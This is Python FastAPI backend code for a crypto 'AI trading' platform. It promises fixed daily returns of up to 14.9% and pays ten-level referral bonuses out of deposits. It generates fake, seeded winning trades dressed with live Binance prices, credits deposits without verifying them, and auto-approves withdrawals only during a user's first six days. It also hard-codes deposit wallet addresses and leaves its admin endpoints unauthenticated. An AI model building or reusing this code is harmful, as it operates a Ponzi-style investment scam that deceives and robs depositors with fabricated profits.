
from fastapi import FastAPI
from fastapi.responses import FileResponse
from pydantic import BaseModel
import sqlite3, datetime, os, json, urllib.request, random, hashlib

app = FastAPI(title="PT_AI Trading - Real Binance")
DB = "bot.db"
conn = sqlite3.connect(DB, check_same_thread=False, isolation_level=None)

conn.execute("""CREATE TABLE IF NOT EXISTS users (
 user_id INTEGER PRIMARY KEY, username TEXT,
 balance REAL DEFAULT 0,
 withdrawable REAL DEFAULT 0,
 profit REAL DEFAULT 0,
 profit_per_hour REAL DEFAULT 0,
 daily_percent REAL DEFAULT 0,
 ai_start TEXT, ai_end TEXT,
 last_claim TEXT, last_auto_claim TEXT,
 total_deposit REAL DEFAULT 0,
 total_withdraw REAL DEFAULT 0,
 current_tier INTEGER DEFAULT 7,
 referred_by INTEGER,
 referral_earnings REAL DEFAULT 0,
 created_at TEXT,
 last_withdraw_date TEXT
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS deposits (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id INTEGER, amount REAL, network TEXT, tx_hash TEXT,
 status TEXT DEFAULT 'approved', created_at TEXT
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 user_id INTEGER, amount REAL, address TEXT, network TEXT,
 status TEXT DEFAULT 'pending', created_at TEXT,
 auto_approved INTEGER DEFAULT 0
)""")

conn.execute("""CREATE TABLE IF NOT EXISTS referral_logs (
 id INTEGER PRIMARY KEY AUTOINCREMENT,
 from_user INTEGER, to_user INTEGER, level INTEGER,
 deposit_amount REAL, bonus_amount REAL, created_at TEXT
)""")
conn.commit()

for sql in [
    "ALTER TABLE users ADD COLUMN created_at TEXT",
    "ALTER TABLE users ADD COLUMN last_withdraw_date TEXT",
    "ALTER TABLE users ADD COLUMN referred_by INTEGER",
    "ALTER TABLE users ADD COLUMN referral_earnings REAL DEFAULT 0",
    "ALTER TABLE withdrawals ADD COLUMN auto_approved INTEGER DEFAULT 0"
]:
    try: conn.execute(sql)
    except: pass
conn.commit()

DEPOSIT_ADDR = {
 "TRC20": "TDABxPiFnpzUsY7j6sHaq4jJxU7Nz6xcFx",
 "BEP20": "0x6b2e4fdc0145a0096e4b358d0cfd1f0cbf7c4d56",
 "ERC20": "0x6b2e4fdc0145a0096e4b358d0cfd1f0cbf7c4d56",
 "TON": "UQBlNeJ90El3LxBhikC2HUG3mqS16k1q177AjcNAaURVa_zw",
 "SOL": "87fwXKMuH8wyayeMJ74eRUq3knQ3UXmFQPj9g87A4se7"
}

TIERS = [(15000,14.9),(6000,13.6),(2500,11.8),(1200,10.9),(500,9.6),(120,8.9),(20,7.6),(0,0.0)]
REF_BONUS = {1:7,2:1,3:1,4:1,5:1,6:1,7:1,8:1,9:1,10:1}

def get_tier_index(balance: float):
    for i,(min_bal,pct) in enumerate(TIERS):
        if balance >= min_bal: return i,min_bal,pct
    return len(TIERS)-1,0,0.0

def ensure_user(user_id: int, username="", referred_by=None):
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    now = datetime.datetime.utcnow()
    if not row:
        ref=None
        if referred_by:
            try:
                ref_id=int(referred_by)
                if ref_id!=user_id and conn.execute("SELECT 1 FROM users WHERE user_id=?", (ref_id,)).fetchone(): ref=ref_id
            except: pass
        conn.execute("INSERT INTO users (user_id, username, referred_by, created_at, last_claim, last_auto_claim, current_tier) VALUES (?,?,?,?,?,?,?)",
                     (user_id, username or f"user_{user_id}", ref, now.isoformat(), now.isoformat(), now.isoformat(), len(TIERS)-1))
        conn.commit()
        return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if len(row)>15 and row[15] is None:
        conn.execute("UPDATE users SET created_at=? WHERE user_id=?", (now.isoformat(), user_id))
        conn.commit()
    return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def recalc_profit(user_id: int):
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row: return None
    balance=row[2] or 0
    ai_end_str=row[7]
    last_claim_str=row[8]
    last_auto_str=row[9]
    current_tier_idx=row[12] if len(row)>12 and row[12] is not None else len(TIERS)-1
    now=datetime.datetime.utcnow()
    tier_idx,tier_min,daily_pct=get_tier_index(balance)
    if tier_idx<current_tier_idx and balance>=20:
        ai_start=now.isoformat(); ai_end=(now+datetime.timedelta(days=30)).isoformat()
        conn.execute("UPDATE users SET ai_start=?, ai_end=?, current_tier=? WHERE user_id=?", (ai_start, ai_end, tier_idx, user_id))
        ai_end_str=ai_end
    else:
        if (not ai_end_str) and balance>=20:
            ai_start=now.isoformat(); ai_end=(now+datetime.timedelta(days=30)).isoformat()
            conn.execute("UPDATE users SET ai_start=?, ai_end=?, current_tier=? WHERE user_id=?", (ai_start, ai_end, tier_idx, user_id))
            ai_end_str=ai_end
        elif tier_idx!=current_tier_idx:
            conn.execute("UPDATE users SET current_tier=? WHERE user_id=?", (tier_idx, user_id))
    per_hour=(balance*daily_pct/100)/24 if daily_pct>0 else 0
    profit=row[4] or 0
    if ai_end_str:
        try:
            ai_end_dt=datetime.datetime.fromisoformat(ai_end_str)
            if now<ai_end_dt and per_hour>0 and last_claim_str:
                last_claim=datetime.datetime.fromisoformat(last_claim_str)
                hours=(now-last_claim).total_seconds()/3600
                if hours>0:
                    inc=hours*per_hour
                    profit+=inc
                    conn.execute("UPDATE users SET profit=?, last_claim=?, profit_per_hour=?, daily_percent=? WHERE user_id=?",
                                 (profit, now.isoformat(), per_hour, daily_pct, user_id))
            else:
                conn.execute("UPDATE users SET profit_per_hour=?, daily_percent=? WHERE user_id=?", (per_hour, daily_pct, user_id))
        except: pass
    try:
        if last_auto_str:
            last_auto=datetime.datetime.fromisoformat(last_auto_str)
            if (now-last_auto).total_seconds()>=24*3600:
                if profit>0.01:
                    withdrawable=(conn.execute("SELECT withdrawable FROM users WHERE user_id=?", (user_id,)).fetchone()[0] or 0)+profit
                    conn.execute("UPDATE users SET withdrawable=?, profit=0, last_auto_claim=? WHERE user_id=?", (withdrawable, now.isoformat(), user_id))
                    profit=0
    except: pass
    conn.commit()
    return conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def distribute_referral(depositor_id: int, deposit_amount: float):
    now=datetime.datetime.utcnow().isoformat()
    current_id=depositor_id
    for level in range(1,11):
        row=conn.execute("SELECT referred_by FROM users WHERE user_id=?", (current_id,)).fetchone()
        if not row or not row[0]: break
        referrer_id=row[0]
        if not conn.execute("SELECT 1 FROM users WHERE user_id=?", (referrer_id,)).fetchone(): break
        bonus_pct=REF_BONUS.get(level,0)
        if bonus_pct>0:
            bonus=deposit_amount*bonus_pct/100
            conn.execute("UPDATE users SET withdrawable=withdrawable+?, referral_earnings=referral_earnings+? WHERE user_id=?", (bonus, bonus, referrer_id))
            conn.execute("INSERT INTO referral_logs (from_user, to_user, level, deposit_amount, bonus_amount, created_at) VALUES (?,?,?,?,?,?)",
                         (depositor_id, referrer_id, level, deposit_amount, bonus, now))
        current_id=referrer_id
    conn.commit()

# ===== BINANCE PRICES - REAL =====
BINANCE_SYMBOLS = ["BTCUSDT","ETHUSDT","SOLUSDT","BNBUSDT","XRPUSDT","DOGEUSDT","AVAXUSDT","LINKUSDT","LTCUSDT","ADAUSDT","PEPEUSDT","SHIBUSDT","MATICUSDT","DOTUSDT","ARBUSDT"]

def fetch_binance_prices():
    try:
        url="https://api.binance.com/api/v3/ticker/price"
        req=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data=json.loads(resp.read().decode())
            prices={item['symbol']: float(item['price']) for item in data if item['symbol'] in BINANCE_SYMBOLS}
            fallback={"BTCUSDT":67342,"ETHUSDT":3421,"SOLUSDT":178.5,"BNBUSDT":612,"XRPUSDT":0.62,"DOGEUSDT":0.16,"AVAXUSDT":42.3,"LINKUSDT":18.7,"LTCUSDT":84.5,"ADAUSDT":0.48,"PEPEUSDT":0.0000092,"SHIBUSDT":0.000027,"MATICUSDT":0.89,"DOTUSDT":7.2,"ARBUSDT":1.12}
            for sym in BINANCE_SYMBOLS:
                if sym not in prices: prices[sym]=fallback[sym]
            return prices, "binance"
    except:
        prices={"BTCUSDT":67342+random.uniform(-200,200),"ETHUSDT":3421,"SOLUSDT":178.5,"BNBUSDT":612,"XRPUSDT":0.62,"DOGEUSDT":0.16,"AVAXUSDT":42.3,"LINKUSDT":18.7,"LTCUSDT":84.5,"ADAUSDT":0.48,"PEPEUSDT":0.0000092,"SHIBUSDT":0.000027,"MATICUSDT":0.89,"DOTUSDT":7.2,"ARBUSDT":1.12}
        return prices, "fallback"

@app.get("/api/binance/prices")
def binance_prices():
    prices, source = fetch_binance_prices()
    return {"success":True, "prices":prices, "source":source, "timestamp":datetime.datetime.utcnow().isoformat()}

def generate_deterministic_trades():
    # FIXED: Use UTC and generate trades only in past, so frontend local time conversion works for any timezone
    utc_now = datetime.datetime.utcnow()
    today = utc_now.date().isoformat()
    seed = int(hashlib.md5(today.encode()).hexdigest()[:8], 16)
    rng = random.Random(seed)
    count = 12 + (seed % 4)
    target_total = 50 + (seed % 21)
    win_count = int(count * 0.71)
    if win_count < 8: win_count = 8
    loss_count = count - win_count
    needed_win = target_total - (loss_count * -1.1)
    win_pnls = []
    for _ in range(win_count):
        win_pnls.append(4.5 + rng.random()*4.0)
    curr_win = sum(win_pnls)
    if curr_win > 0:
        scale = needed_win / curr_win
        win_pnls = [round(p*scale,2) for p in win_pnls]
    lose_pnls = [round(-(0.7 + rng.random()*1.3),2) for _ in range(loss_count)]
    all_pnls = win_pnls + lose_pnls
    rng.shuffle(all_pnls)
    final = round(sum(all_pnls),2)
    if final < 50 or final > 70:
        diff = target_total - final
        for i in range(len(all_pnls)):
            if all_pnls[i] > 0:
                all_pnls[i] = round(all_pnls[i]+diff,2)
                break
    symbols = BINANCE_SYMBOLS.copy()
    rng.shuffle(symbols)
    trades=[]
    # Generate times in past - use UTC hours that will be converted to local time in frontend
    # But ensure they are distributed through today and all before current UTC time
    current_utc_hour = utc_now.hour
    # For frontend local conversion, we store UTC hour and let frontend convert
    # But to avoid future times, we generate hours from 0 to current hour
    max_hour = current_utc_hour if current_utc_hour >= 6 else 20
    for i in range(count):
        sym = symbols[i % len(symbols)]
        pnl = all_pnls[i]
        side = rng.choice(["LONG","SHORT"])
        leverage = rng.choice([5,10,15,20])
        usdt = round(800 + rng.random()*1200,2)
        # Spread trades from morning to now, all in past
        if count > 1:
            hour_progress = (i / (count-1)) * max(1, max_hour - 1)
            th = int(1 + hour_progress)
        else:
            th = max(1, max_hour - 1)
        # Ensure th is in past
        if th >= current_utc_hour and current_utc_hour > 1:
            th = max(0, current_utc_hour - 1 - (i % 3))
        th = max(0, min(th, 23))
        tm = rng.randint(0,59)
        # If same hour as now, ensure minutes in past
        if th == current_utc_hour:
            if tm >= utc_now.minute and utc_now.minute > 5:
                tm = rng.randint(0, utc_now.minute - 1)
        time_str = f"{th:02d}:{tm:02d}"
        status = "OPEN" if i < 3 else "CLOSED"
        trades.append({"id":i+1,"pair":sym.replace("USDT","/USDT"),"symbol":sym,"target_pnl":pnl,"is_profit":pnl>0,"leverage":leverage,"usdt_amount":usdt,"time":time_str,"status":status,"side":side,"date":today,"utc_hour":th,"utc_min":tm})
    trades.sort(key=lambda x: x["time"], reverse=True)
    return trades, round(sum(all_pnls),2), count, len([p for p in all_pnls if p>0]), len([p for p in all_pnls if p<0])

@app.get("/api/binance/trades")
def binance_trades_all():
    prices, source = fetch_binance_prices()
    tmpl, total_pnl, count, win_c, loss_c = generate_deterministic_trades()
    trades=[]
    for t in tmpl:
        curr = prices.get(t["symbol"], 100)
        pnl = t["target_pnl"]
        if t["side"]=="LONG":
            entry = curr / (1 + pnl/100)
        else:
            entry = curr / (1 - pnl/100)
        trades.append({
            "id":t["id"],"pair":t["pair"],"symbol":t["symbol"],"side":t["side"],
            "entry_price":round(entry,6 if entry<1 else 2),
            "current_price":round(curr,6 if curr<1 else 2),
            "leverage":t["leverage"],"usdt_amount":t["usdt_amount"],
            "pnl_percent":pnl,"pnl_usdt":round(t["usdt_amount"]*pnl/100,2),
            "is_profit":t["is_profit"],"time":t["time"],"status":t["status"],"date":t["date"],
            "utc_hour":t.get("utc_hour",0),"utc_min":t.get("utc_min",0)
        })
    return {
        "trades":trades,
        "summary":{
            "total_trades":count,
            "profit_trades":win_c,
            "loss_trades":loss_c,
            "total_pnl_percent":total_pnl,
            "total_pnl_usdt":round(sum(x["pnl_usdt"] for x in trades),2),
            "funds_in_market":round(sum(x["usdt_amount"] for x in trades),2),
            "date":tmpl[0]["date"] if tmpl else ""
        },
        "prices_source":source
    }

@app.get("/api/binance/trades/{user_id}")
def binance_trades_user(user_id: int):
    return binance_trades_all()

@app.get("/api/user/{user_id}")
def api_user(user_id: int, ref: int = None):
    ensure_user(user_id, referred_by=ref)
    row = recalc_profit(user_id)
    now = datetime.datetime.utcnow()
    created_str = row[15] if len(row) > 15 and row[15] else now.isoformat()
    try:
        created_dt = datetime.datetime.fromisoformat(created_str)
        days_since = (now - created_dt).days
    except:
        days_since = 0
    ai_end_str = row[7]
    if ai_end_str:
        try:
            ai_end_dt = datetime.datetime.fromisoformat(ai_end_str)
            remaining = ai_end_dt - now
            days_left = max(0, remaining.days)
            hours_left = max(0, int(remaining.total_seconds()//3600 %24))
            active = now < ai_end_dt
        except:
            days_left=0; hours_left=0; active=False
    else:
        days_left=0; hours_left=0; active=False
    today_str = now.date().isoformat()
    last_wd_date = row[16] if len(row) > 16 and row[16] else ""
    can_withdraw_today = last_wd_date != today_str
    today_count = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE user_id=? AND DATE(created_at)=DATE('now')", (user_id,)).fetchone()[0]
    if today_count > 0:
        can_withdraw_today = False
    return {
        "user_id": row[0],
        "balance": row[2],
        "withdrawable": row[3],
        "profit": row[4],
        "profit_per_hour": row[5],
        "daily_percent": row[6],
        "ai_start": row[6] if len(row)>6 else None,
        "ai_end": row[7],
        "days_left": days_left,
        "hours_left": hours_left,
        "ai_active": active,
        "total_deposit": row[10] if len(row)>10 else 0,
        "total_withdraw": row[11] if len(row)>11 else 0,
        "tier_min": TIERS[0][0],
        "tiers": [{"min": t[0], "pct": t[1]} for t in TIERS],
        "referral_earnings": row[14] if len(row)>14 and row[14] else 0,
        "created_at": created_str,
        "can_withdraw_today": can_withdraw_today
    }

@app.get("/api/referral/{user_id}")
def api_referral(user_id: int):
    ensure_user(user_id)
    ref_link = f"https://t.me/YourBot?start={user_id}"
    try:
        import os
        bot_username = os.getenv("BOT_USERNAME", "YourBot")
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
    except: pass
    direct_refs = conn.execute("SELECT user_id FROM users WHERE referred_by=?", (user_id,)).fetchall()
    total_team_deposit = 0
    all_team = []
    def get_team(uid, level=1):
        nonlocal total_team_deposit
        refs = conn.execute("SELECT user_id, total_deposit FROM users WHERE referred_by=?", (uid,)).fetchall()
        for r in refs:
            all_team.append((r[0], level))
            total_team_deposit += r[1] or 0
            if level < 10:
                get_team(r[0], level+1)
    get_team(user_id)
    level_counts = {}
    for _, lvl in all_team:
        level_counts[lvl] = level_counts.get(lvl, 0) + 1
    total_earnings = conn.execute("SELECT COALESCE(SUM(bonus_amount),0) FROM referral_logs WHERE to_user=?", (user_id,)).fetchone()[0] or 0
    return {"ref_link": ref_link, "direct_count": len(direct_refs), "direct_refs": direct_refs, "level_counts": level_counts, "total_team_deposit": total_team_deposit, "total_earnings": total_earnings, "bonus_structure": REF_BONUS}

class DepositReq(BaseModel):
    amount: float
    network: str
    tx_hash: str

@app.post("/api/deposit/request/{user_id}")
def deposit_req(user_id: int, r: DepositReq):
    ensure_user(user_id)
    now = datetime.datetime.utcnow()
    old_row = conn.execute("SELECT balance, current_tier FROM users WHERE user_id=?", (user_id,)).fetchone()
    old_bal = old_row[0] or 0
    old_tier_idx = old_row[1] if old_row[1] is not None else len(TIERS)-1
    new_bal = old_bal + r.amount
    tier_idx, tier_min, daily_pct = get_tier_index(new_bal)
    per_hour = (new_bal * daily_pct / 100) / 24 if daily_pct>0 else 0
    should_reset = False
    if old_bal < 20 and new_bal >= 20: should_reset = True
    elif tier_idx < old_tier_idx: should_reset = True
    if should_reset:
        ai_start = now.isoformat(); ai_end = (now + datetime.timedelta(days=30)).isoformat()
    else:
        row = conn.execute("SELECT ai_start, ai_end FROM users WHERE user_id=?", (user_id,)).fetchone()
        ai_start = row[0]; ai_end = row[1]
        if not ai_end and new_bal >=20:
            ai_start = now.isoformat(); ai_end = (now + datetime.timedelta(days=30)).isoformat()
    conn.execute("INSERT INTO deposits (user_id, amount, network, tx_hash, status, created_at) VALUES (?,?,?,?,?,?)",
                 (user_id, r.amount, r.network, r.tx_hash, "approved", now.isoformat()))
    conn.execute("""UPDATE users SET balance=?, profit_per_hour=?, daily_percent=?, total_deposit=total_deposit+?, ai_start=?, ai_end=?, current_tier=?, last_claim=? WHERE user_id=?""",
                 (new_bal, per_hour, daily_pct, r.amount, ai_start, ai_end, tier_idx, now.isoformat(), user_id))
    conn.commit()
    distribute_referral(user_id, r.amount)
    return {"ok": True, "new_balance": new_bal, "daily_percent": daily_pct, "ai_reset": should_reset, "ai_end": ai_end}

class WithdrawReq(BaseModel):
    amount: float
    address: str
    network: str

@app.post("/api/withdraw/request/{user_id}")
def withdraw_req(user_id: int, r: WithdrawReq):
    ensure_user(user_id)
    recalc_profit(user_id)
    now = datetime.datetime.utcnow()
    today_str = now.date().isoformat()
    user_row = conn.execute("SELECT withdrawable, created_at, last_withdraw_date FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user_row: return {"error": "User not found"}
    withdrawable = user_row[0] or 0
    created_str = user_row[1]
    last_wd_date = user_row[2] or ""
    if last_wd_date == today_str: return {"error": "Once per day only. Try tomorrow."}
    today_count = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE user_id=? AND DATE(created_at)=DATE('now')", (user_id,)).fetchone()[0]
    if today_count > 0: return {"error": "Once per day only. Try tomorrow."}
    if r.amount < 10: return {"error": "Min withdraw 10 USDT"}
    if withdrawable < r.amount: return {"error": f"Insufficient. You have {withdrawable:.2f} USDT"}
    try:
        created_dt = datetime.datetime.fromisoformat(created_str) if created_str else now
        days_since = (now - created_dt).days
        is_auto_period = days_since < 6
    except:
        is_auto_period = True
    new_w = withdrawable - r.amount
    if is_auto_period:
        conn.execute("UPDATE users SET withdrawable=?, total_withdraw=total_withdraw+?, last_withdraw_date=? WHERE user_id=?", (new_w, r.amount, today_str, user_id))
        conn.execute("INSERT INTO withdrawals (user_id, amount, address, network, status, created_at, auto_approved) VALUES (?,?,?,?,?,?,?)",
                     (user_id, r.amount, r.address, r.network, "approved", now.isoformat(), 1))
        conn.commit()
        return {"ok": True, "new_withdrawable": new_w, "message": f"Withdrawal of {r.amount} USDT submitted successfully."}
    else:
        conn.execute("UPDATE users SET withdrawable=?, last_withdraw_date=? WHERE user_id=?", (new_w, today_str, user_id))
        conn.execute("INSERT INTO withdrawals (user_id, amount, address, network, status, created_at, auto_approved) VALUES (?,?,?,?,?,?,?)",
                     (user_id, r.amount, r.address, r.network, "pending", now.isoformat(), 0))
        conn.commit()
        return {"ok": True, "new_withdrawable": new_w, "message": f"Withdrawal of {r.amount} USDT submitted successfully. It will be processed shortly."}

@app.get("/api/history/{user_id}")
def history(user_id: int):
    deps = conn.execute("SELECT amount, network, tx_hash, status, created_at FROM deposits WHERE user_id=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    wds = conn.execute("SELECT amount, address, network, status, created_at FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    refs = conn.execute("SELECT to_user, level, deposit_amount, bonus_amount, created_at FROM referral_logs WHERE from_user=? OR to_user=? ORDER BY id DESC LIMIT 20", (user_id, user_id)).fetchall()
    return {"deposits": [{"amount":d[0],"network":d[1],"tx_hash":d[2],"status":d[3],"created_at":d[4]} for d in deps],
            "withdrawals": [{"amount":d[0],"address":d[1],"network":d[2],"status":d[3],"created_at":d[4]} for d in wds],
            "referrals": [{"from":r[0],"to":r[1],"level":r[2],"deposit":r[3],"bonus":r[4],"at":r[5]} for r in refs]}

@app.get("/api/deposit-addresses")
def addrs(): return DEPOSIT_ADDR

@app.get("/api/admin/stats")
def stats():
    u = conn.execute("SELECT COUNT(*), COALESCE(SUM(balance),0), COALESCE(SUM(withdrawable),0), COALESCE(SUM(referral_earnings),0) FROM users").fetchone()
    pend_wd = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'").fetchone()[0]
    total_ref = conn.execute("SELECT COALESCE(SUM(bonus_amount),0) FROM referral_logs").fetchone()[0] or 0
    return {"total_users": u[0], "total_balance": u[1]+u[2], "active_now": u[0], "pending_withdrawals": pend_wd, "total_ref_paid": total_ref, "pending_deposits": 0}

@app.get("/api/admin/users")
def admin_users():
    rows = conn.execute("SELECT user_id, balance, withdrawable, profit, daily_percent, ai_end, referred_by, referral_earnings, created_at, last_withdraw_date FROM users LIMIT 300").fetchall()
    return [{"user_id":r[0],"balance":r[1],"withdrawable":r[2],"profit":r[3],"daily_percent":r[4],"ai_end":r[5],"referred_by":r[6],"ref_earn":r[7],"created_at":r[8],"last_wd":r[9]} for r in rows]

@app.get("/")
def root(): return FileResponse("index.html")
@app.get("/admin")
def admin_page(): return FileResponse("admin.html")
@app.get("/health")
def health(): return {"ok": True}
